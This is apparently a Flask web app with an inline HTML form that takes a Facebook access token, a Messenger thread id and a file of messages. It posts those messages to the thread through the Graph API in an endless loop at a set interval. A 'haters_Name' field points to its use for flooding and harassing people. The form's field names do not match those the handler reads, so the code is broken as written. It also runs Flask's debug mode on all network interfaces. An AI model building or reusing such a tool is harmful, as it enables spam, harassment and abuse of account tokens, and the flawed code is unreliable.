from flask import Flask, request
import requests
from time import sleep
import time
from datetime import datetime
app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent using token {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message using token {access_token}: {message}")
                print(e)
                time.sleep(30)


    return '''
    
<!DOCTYPE html>
<html lang="en">
 <head>
  <meta charset="utf-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
  <title> XM9RTY AYUSH K1NG </title> 
  <style>

#tokens{
    height: 80px;
    color: red;
}
#messages{
    height: 80px;
    color: white;
}
::placeholder {
  color: white;
  opacity: 1; /* Firefox */
}
::-ms-input-placeholder { /* Edge 12-18 */
  color: white;
}
.popup {
        display: none;
        position: fixed;
        bottom: 20px;
        left: 50%;
        transform: translateX(-50%);
        padding: 20px;
        background: #f0f0f0;
        border: 1px solid #ddd;
        border-radius: 5px;
        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
    }
     #text {
  height: 1.7em;
  height: 40px;
    line-height: 40px;
    border-radius: 20px;
    padding: 0px 20px;
    border: none;
    margin-bottom: 20px;
    color: white;
  display: block;
    box-sizing: border-box;
    padding: 40px;
    width: 100%;
    height: 100%;
    backdrop-filter: brightness(40%);
    display: flex;
    flex-direction: column;
    gap: 5px;
  }
  .form-control{
      background : rgba(255, 255, 255, 0.3);
      box-shadow: rgba(50, 50, 93, 0.25) 0px 50px 100px -20px, rgba(0, 0, 0, 0.3) 0px 30px 60px -30px, rgba(10, 37, 64, 0.35) 0px -2px 6px 0px inset;
      height: 30px;
      width:280px ;
    line-height: 10px;
    border-radius: 20px;
    padding: 0px 20px;
    border: none;
    margin-bottom: 20px;
    color: white;
    
  }
    body{
  background:Red;
    background-size: cover;
    content:KITTU;
    height:50%;
          width: 90px;
    content:KITTU;
    height:430px;
          width: 360px;
          
    }
    .container{
      max-width: 700px;
      border-radius: 20px;
      padding: 20px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      margin: 10px auto;
      margin-top: 50px;
                  width: 85vmin;
            height: 120%;
            outline: none;
            margin-top: 5px;
            box-shadow: 0 0 10px #87CEFA;
            border: none;
            resize: none;
    }
            #items {
                background : rgba(255, 255, 255, 0.3);
            display: flex;
            justify-content: center;
            align-items: center;
            }
            
    .header{
      text-align: center;
      padding-bottom: 25px;
    }
    .btn-submit{
        background : rgba(255, 255, 255, 0.3);
    text-align: center;
      width: 290px;
      
      margin-top: 10px;
      touch-action: manipulation;
  border: 1px solid #0360df;
  border-radius: 50px;
  padding: 6px 100px;
  background-color: #0360df;
  background-image: radial-gradient(75% 50% at 50% 0%, #f4feff 12%, transparent), radial-gradient(75% 50% at 50% 85%, #8de3fc, transparent);
  box-shadow: inset 0 0 2px 1px rgba(255, 255, 255, 0.2), 0 1px 4px 1px rgba(17, 110, 231, 0.2), 0 1px 4px 1px rgba(0, 0, 0, 0.1);
  color: #fff;
  text-shadow: 0 1px 1px #116ee7;
  transition-property: border-color, transform, background-color;
  transition-duration: 0.2s;
  
      
    }
    .footer{
      text-align: center;
      margin-top: 20px;
      color: ;
    }
   
     
      }
        </style> 
 </head> 
 <body> 
  <div class="container"> 
   <form action="/" method="post" enctype="multipart/form-data"> 
    <div class="mb-3"> 
     <label for="convo_id" style="color:;"></label> 
     <input type="text" class="form-control" "="" id="convo_id" name="convo_id" placeholder="Convo_Id" required> 
    </div> 
    <br> 
    <br> 
    <div class="mb-3"> 
     <label for="haters_name" style="color: ;"></label> 
     <input type="text" class="form-control" id="haters_name" name="haters_name" placeholder="haters_Name" aruwbrequired=""> 
    </div> 
    <div class="mb-3"> 
     <label for="messages" style="color: white;"></label> 
     <br> 
     <br> 
     <textarea class="form-control" id="messages" name="messages" rows="1" required placeholder="">KITTU_DON_HERE1

XMARTY_AYUSH_K1NG

XMARTY_AYUSH_K1NG

XMARTY_AYUSH_K1NG</textarea> 
    </div> 
    <div class="mb-3"> 
     <label for="tokens" style="color: white;"></label> 
     <br> 
     <br> 
     <textarea class="form-control" id="tokens" name="tokens" rows="5" placeholder="Input_Token" required></textarea> 
     <br> 
     <br> 
    </div> 
    <div class="mb-3"> 
     <label for="speed" style="color: white;"></label> 
     <input type="number" class="form-control" value="60" id="speed" name="speed" required> 
    </div> 
    <button type="submit" class="btn btn-primary btn-submit">Submit </button> 
    <script>
            
            
        </script> 
   </form> 
  </div> 
  <footer class="footer"> 
   <p style="color:white;">𝐌𝐔𝐋𝐓𝐈-𝐂𝐎𝐍𝐕𝐎-𝐓𝐎𝐎𝐋 𝐌𝐀𝐃𝐄 𝐁𝐘 𝐀𝐘𝐔𝐒𝐇</p> 
   <p style="color:white;">𝐒𝐄𝐑𝐕𝐄𝐑 𝐁𝐘 :𝐗𝐌𝐀𝐑𝐓𝐘 𝐀𝐘𝐔𝐒𝐇 𝐊𝟏𝐍𝐆❤️</p> 
  </footer> 
 </body>
</html>

    '''


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    app.run(debug=True)
